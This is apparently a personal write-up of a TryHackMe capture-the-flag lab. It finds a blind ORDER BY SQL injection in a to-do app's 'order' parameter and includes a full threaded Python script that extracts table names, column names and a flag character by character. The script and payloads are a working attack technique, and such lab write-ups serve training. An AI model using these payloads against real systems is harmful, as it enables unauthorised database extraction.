---
created: 2026-01-26
tags:
  - note
  - journal
  - cyberStuff
title: Prioritise
draft: false
date:
subiect:
  - sql
dificultate: 2
amuca: false
link:
  - https://tryhackme.com/room/prioritise
lastmod: 2026-10-09T12:43:20.889Z
---
Description:\
"We have this new to-do list application, where we order our tasking based on priority! Is it really all that secure, though...?"

I checked the website and added a new task to the to-do list:\
![](/images/static/Pasted%20image%2020260126120647.png)\
Let's check for basic SQL injection:\
![](/images/static/Pasted%20image%2020260126120808.png)\
Nothing special in the beginning:\
![](/images/static/Pasted%20image%2020260127055947.png)\
I created a new event in the task list and intercepted it via Burp Suite to look for anything interesting:\
![](/images/static/Pasted%20image%2020260127060055.png)\
The request seems normal.\
I wanted to try modifying the Content-Length header, maybe we could cause a buffer overflow:\
![](/images/static/Pasted%20image%2020260127060232.png)\
Nothing special.

OK, something interesting happens when we try to change the `order` parameter:\
![](/images/static/Pasted%20image%2020260127060600.png)\
![](/images/static/Pasted%20image%2020260127060609.png)\
We can modify the `order` parameter as we want.

I set the value of `order` to:\
`title%20DESC%20--`\
and got the following:\
![](/images/static/Pasted%20image%2020260127060725.png)\
OK cool, I think we encountered an ORDER BY SQL injection:\
https://portswigger.net/support/sql-injection-in-the-query-structure

To verify the SQL injection, I tried the following payload: `http://10.64.190.116/?order=(CASE%20WHEN%20(1=1)%20THEN%20title%20ELSE%20date%20END);%20--`

![](/images/static/Pasted%20image%2020260127063021.png)\
Since the application is vulnerable to boolean-based blind SQL injection, we can manually extract some initial information needed for the flag.

For the next four sections, we will be using the payloads from this awesome repo: <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md>

Since I don't know how to write Python for this right now and didn't have time to invest in scripting it from scratch, I found this script in this writeup:\
https://medium.com/@lorenzomoulin/tryhackme-prioritise-15ef05623e48

```
import requests  
import threading  
  
chars = [chr(i) for i in range(33, 127)]  
  
s = requests.Session()  
  
url = "http://<IP>/"  
  
ok = s.get(url + r"?order=(CASE%20WHEN%20(1=1)%20THEN%20title%20ELSE%20date%20END);%20--")  
ok = ok.content  
  
ans = ['' for i in range(38)]  
  
table_name = ""  
column_name = ""  
flag = ""  
  
def do_column_name(i: int, u: str, c: str):  
    payload = f"""?order=(CASE%20WHEN%20(SELECT%20substr(name,%20{i},%201)%20FROM%20pragma_table_info('{table_name}'))=%27{c}%27%20THEN%20title%20ELSE%20date%20END);%20--"""  
    return s.get(u+payload)  
  
def do_table_name(i: int, u: str, c: str):  
    payload = f"""?order=(CASE%20WHEN%20(SELECT%20substr(name,%20{i},%201)%20FROM%20sqlite_schema%20WHERE%20type%20='table'%20LIMIT%201%20OFFSET%201)=%27{c}%27%20THEN%20title%20ELSE%20date%20END);%20--"""  
    return s.get(u+payload)  
  
def do_get_flag(i: int, u: str, c: str):  
    payload = f"""?order=(CASE%20WHEN%20(SELECT%20substr({column_name},%20{i},%201)%20FROM%20{table_name})=%27{c}%27%20THEN%20title%20ELSE%20date%20END);%20--"""  
    return s.get(u+payload)  
  
def tgt(i: int):  
    for c in chars:  
        fail = True  
        while fail:  
            try:  
                if action == "flag":  
                    response = do_get_flag(i, url, c)  
                elif action == "table":  
                    response = do_table_name(i, url, c)  
                else:  
                    response = do_column_name(i, url, c)  
            except:  
                continue  
            else:  
                fail = False  
        if response.content == ok:  
            ans[i-1] = c  
            break  
  
actions = ["table", "column", "flag"]  
for action in actions:  
    threads = list()  
  
    for j in range(38):  
        t = threading.Thread(target=tgt, args=(j+1, ))  
        t.start()  
        threads.append(t)  
  
    for t in threads:  
        t.join()  
    print(f"action: {action}")  
    print(''.join(ans))  
    if action == "table":  
        table_name = ''.join(ans)  
    elif action == "column":  
        column_name = ''.join(ans)  
    else:  
        flag = ''.join(ans)  
    ans = ['' for i in range(38)]
    
```

Since it feels quite like cheating to do this, I'm going to explain as best I can what the script does:\
From what I gathered after reading the script, it brute-forces the table name containing the flag (which turns out to be "secret\_flag"), then brute-forces the column name ("flag\_value"), and finally extracts the flag value character by character.\
![](/images/static/Pasted%20image%2020260127071247.png)\
And hooray, we find the flag!
